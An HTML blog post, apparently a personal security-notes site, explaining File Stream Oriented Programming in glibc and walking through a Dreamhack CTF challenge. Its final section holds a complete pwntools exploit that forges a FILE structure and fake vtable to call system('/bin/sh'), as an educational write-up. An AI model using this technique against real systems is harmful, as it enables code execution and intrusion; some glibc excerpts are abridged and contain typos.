@@ -1,0 +1,352 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE]FSOP · whrds.log</title><meta name="description" content="FSOPFile Stream Oriented Programming This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.file stream structure">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-fsop/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-fsop/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-fsop/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE]FSOP · whrds.log"><meta property="og:description" content="FSOPFile Stream Oriented Programming This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.file stream structure"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-fsop/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE]FSOP","description":"FSOPFile Stream Oriented Programming This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.file stream structure","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-fsop/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-fsop/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE]FSOP</h1><p class="article-description">FSOPFile Stream Oriented Programming This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.file stream structure</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>3 min read</span></div></header><div class="prose"><h3>FSOP</h3>
+<p>File Stream Oriented Programming</p>
+<p>This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.</p>
+<ul>
+<li>Understanding the file stream structure: You must analyze the FILE structure of libc to understand the fields.</li>
+</ul>
+<p>_IO_FILE: A structure to represent a file stream in the standard library of the Linux system.</p>
+<pre><code>struct _IO_FILE_plus
+{
+FILE file;
+  const struct _IO_jump_t *vtable;
+};
+struct _IO_FILE
+{
+  int _flags;
+  char *_IO_read_ptr;
+  char *_IO_read_end;
+  char *_IO_read_base;
+  char *_IO_write_base;
+  char *_IO_write_ptr;
+  char *_IO_write_end;
+  char *_IO_buf_base;
+  char *_IO_buf_end;
+  char *_IO_save_base;
+  char *_IO_backup_base;
+  char *_IO_save_end;
+  struct _IO_marker *_markers;
+  struct _IO_FILE *_chain;
+  int _fileno;
+  int _flags2;
+  __off_t _old_offset;
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+</code></pre>
+<p>_flags: Permissions for files </p>
+<p>(0xfbad0000 is the magic number)</p>
+<p>_IO_read_ptr / _IO_write_ptr: Buffer pointer for reading and writing files.</p>
+<p>_IO_read_base / _IO_write_base: Pointer to the starting address of the file read and write buffer.</p>
+<p>_IO_read_end / _IO_write_end: Pointer to the end of the file read and write buffer.</p>
+<p>_chain: Field to create a linked list</p>
+<p>_fileno: File descriptor value</p>
+<p>_IO_jump_t*vatlbe: Virtual table that performs file-related operations.</p>
+<pre><code>FILE *_IO_new_file_fopen(FILE *fp, const char
+*filename, const char *mode,
+                         int is32not64) {
+  int oflags = 0, omode;
+  int read_write;
+  int oprot = 0666;
+  int i;
+  FILE *result;
+  const char *cs;
+  const char *last_recognized;
+  if (_IO_file_is_open(fp)) return 0;
+  switch (*mode) {
+    case 'r':
+      omode = O_RDONLY;
+      read_write = _IO_NO_WRITES;
+      break;
+    case 'w':
+      omode = O_WRONLY;
+      oflags = O_CREAT | O_TRUNC;
+      read_write = _IO_NO_READS;
+      break;
+    case 'a':
+      omode = O_WRONLY;
+      oflags = O_CREAT | O_APPEND;
+      read_write = _IO_NO_READS | _IO_IS_APPENDING;
+      break;
+      ...
+}
+</code></pre>
+<p>When opening a file with fopne, set the mode value by passing the _flags variable.</p>
+<p>Check and set permissions in the _IO_new_file_fopne function.</p>
+<p><strong>_IO_FILE : vtable</strong></p>
+<p>This is a table allocated when using class definitions and virtual functions in object-oriented programming languages.</p>
+<p>When the address of a virtual function is stored and used in memory, the relative address is called based on the table.</p>
+<pre><code>                               #define fread(p, m, n, s) _IO_fread (p, m, n, s)
+                               size_t
+                               _IO_fread (void *buf, size_t size, size_t count, FILE
+                               *fp)
+                               {
+                                 size_t bytes_requested = size * count;
+                                 size_t bytes_read;
+                                 CHECK_FILE (fp, 0);
+                                 if (bytes_requested == 0)
+                                   return 0;
+                                 _IO_acquire_lock (fp);
+                                 _IO_release_lock (fp);
+                                 return bytes_requested == bytes_read ? count :
+                               bytes_read / size;
+                               }
+</code></pre>
+<p>This is the process of calling the fread function.</p>
+<p>In the code above, the _IO_sgetn function is called.</p>
+<pre><code>#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
+DATA, N)
+#define JUMP2(FUNC, THIS, X1, X2)
+(_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)
+#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
+( (THIS)))
+size_t
+_IO_sgetn (FILE *fp, void *data, size_t n)
+{
+  /* FIXME handle putback buffer here! */
+  return _IO_XSGETN (fp, data, n);
+}
+</code></pre>
+<p>Call _IO_XSGETN from the _IO_sgetn function.</p>
+<p>The _IO_XSGETN function is a function included in the vtable structure.</p>
+<p>You can check that file functions, including the fread function, refer to the vtable variable.</p>
+<pre><code>#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
+DATA, N)
+#define JUMP2(FUNC, THIS, X1, X2)
+(_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)
+#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
+( (THIS)))
+size_t
+_IO_sgetn (FILE *fp, void *data, size_t n)
+{
+  return _IO_XSGETN (fp, data, n);
+}
+</code></pre>
+<p>In the process of referencing the vtable, IO_validate_vatlbe() is called.</p>
+<p>Allocate vtable in the _libc_IO_vtables section.</p>
+<pre><code>static inline const struct _IO_jump_t *
+IO_validate_vtable (const struct _IO_jump_t *vtable)
+{
+  /* Fast path: The vtable pointer is within the
+__libc_IO_vtables
+section. */
+uintptr_t section_length = __stop___libc_IO_vtables
+- __start___libc_IO_vtables;
+  const char *ptr = (const char *) vtable;
+  uintptr_t offset = ptr - __start___libc_IO_vtables;
+  if (__glibc_unlikely (offset &gt;= section_length))
+    /* The vtable pointer is not in the expected
+section.  Use the
+       slow path, which will terminate the process if
+necessary.  */
+    _IO_vtable_check ();
+  return vtable;
+}
+</code></pre>
+<p>Determine the size of the session using the start/end addresses of the vtable.</p>
+<pre><code>int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    }
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+      return EOF;
+      else
+      {
+        char *new_buf;
+        char *old_buf = fp-&gt;_IO_buf_base;
+        size_t old_blen = _IO_blen (fp);
+        _IO_size_t new_size = 2 * old_blen + 100;
+        if (new_size &lt; old_blen)
+          return EOF;
+        new_buf
+          = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
+</code></pre>
+<p>_IO_str_overflow is included in _libc_IO_vtables.</p>
+<p>At the end, call the _s._allocate_buffer function pointer.</p>
+<pre><code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)
+size_t old_blen = _IO_blen (fp);
+_IO_size_t new_size = 2 * old_blen + 100;
+if (new_size &lt; old_blen)
+return EOF;
+</code></pre>
+<p>Pass the new_size variable as a function argument.</p>
+<p>Use the operation values ​​of _IO_buf_end and _IO_buf_base.</p>
+<p>With this, you can manipulate the new_size variable.</p>
+<pre><code>int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+    return flush_only ? 0 : EOF;
+if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+  {
+    fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+    fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+    fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+}
+pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+  {
+    if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+    else
+    {
+      char *new_buf;
+      char *old_buf = fp-&gt;_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      _IO_size_t new_size = 2 * old_blen + 100;
+      if (new_size &lt; old_blen)
+        return EOF;
+      new_buf
+        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
+</code></pre>
+<p>This is the code that must be checked to call the function pointer.</p>
+<p>I will separate that part and check.</p>
+<pre><code> int flush_only = c == EOF;
+ _IO_size_t pos;
+pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+ if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+</code></pre>
+<p>Use _IO_write_base and _IO_write_ptr.</p>
+<p>The initial value of flush_only is 0.</p>
+<p>If you look at the condition part, it is if(pos &gt;= _IO_blen(fp)).</p>
+<p>_IO_write_ptr = func@add<br>
+_IO_write_base = 0<br>
+pos = func@add</p>
+<p>I will solve Bypass _IO_str_overflow among the dreamhack problems.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+FILE *fp;
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+int main() {
+  init();
+  fp = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);
+  printf(&quot;stdout: %p\n&quot;, stdout);
+  printf(&quot;Data: &quot;);
+  read(0, fp, 300);
+  fclose(fp);
+}
+</code></pre>
+<p>Because it outputs the address of the stdout pointer, you can obtain libc_base.</p>
+<pre><code>p.recvuntil(&quot;stdout: &quot;)
+stdout_leak = int(p.recvuntil(b&quot;\n&quot;).strip(b&quot;\n&quot;),16)
+libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
+io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
+io_str_overflow = io_file_jumps + 0xd8
+fake_vtable = io_str_overflow - 16
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+system_add = libc_base + libc.symbols['system']
+fp = elf.symbols['fp']
+</code></pre>
+<p>This is the process of obtaining libc_base and the necessary addresses.</p>
+<p>Additionally, you can obtain the fake_vtable address.</p>
+<p>Because the new_size variable is obtained using _IO_buf_end and base,</p>
+<p>If you set _IO_buf_end to the binsh string address and base to 0,</p>
+<p>The new_size variable points to the binsh string.</p>
+<p>Looking at the conditions again</p>
+<pre><code> int flush_only = c == EOF;
+ _IO_size_t pos;
+pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+ if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+</code></pre>
+<p>_IO_write_ptr and _IO_buf_end must be set identically.</p>
+<p>This is to pass the condition of -&gt; _IO_str_overflow.</p>
+<pre><code>       new_buf
+         = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)
+(new_size);
+</code></pre>
+<p>At the end of the code, call _IO_FINISH inside the fclose function.</p>
+<p>_IO_FINISH calls the address located 16 bytes away from the vatble address.</p>
+<p>=&gt; If the vtable address is covered with the (IO_str_overflow - 16) address, the IO_str_overflow function is called by fcloase.</p>
+<pre><code>from pwn import *
+
+p = remote('host3.dreamhack.games', 15070)
+libc = ELF('./libc.so.6')
+elf = ELF('./bypass_valid_vtable')
+
+p.recvuntil(&quot;stdout: &quot;)
+stdout_leak = int(p.recvuntil(b&quot;\n&quot;).strip(b&quot;\n&quot;),16)
+libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
+
+io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
+io_str_overflow = io_file_jumps + 0xd8
+fake_vtable = io_str_overflow - 16
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+system_add = libc_base + libc.symbols['system']
+fp = elf.symbols['fp']
+
+payload = p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(int((binsh - 100) / 2))
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(int((binsh - 100) / 2))
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(fp + 0x80)
+payload += p64(0x0)*9
+payload += p64(fake_vtable)
+payload += p64(system_add)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>If you run it, you can get the flag.</p>
+<p><img src="/assets/images/tistory/tistory-8af5082e9c5d/001.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-fsop/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
